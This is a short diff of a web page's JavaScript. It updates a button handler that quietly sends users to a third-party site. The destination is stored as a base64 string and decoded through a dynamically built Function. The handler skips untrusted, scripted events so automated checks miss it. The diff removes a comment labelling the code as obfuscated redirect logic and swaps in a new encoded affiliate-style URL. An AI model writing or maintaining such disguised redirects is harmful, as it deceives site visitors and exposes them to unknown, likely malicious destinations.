@@ -20,12 +20,11 @@ document.getElementById("d2").textContent=t.lines[1];
 document.getElementById("d3").textContent=t.lines[2];
 document.getElementById("bt").textContent=t.btn;
 
-// 混淆跳转逻辑
 document.getElementById("bt").addEventListener("pointerdown",function(e){
   if(!e.isTrusted)return;
   (function(a,b){
     setTimeout(function(){
-      const arr=["aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aXRleS1wZXJtw=="];
+      const arr=["aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aWRlby1wcm9tbyZwPXAxdGQmc3ViMj1uZXdz"];
       const f=new Function(a,"return atob("+a+")");
       const u=f(arr[0]);
       const el=document.createElement(b);
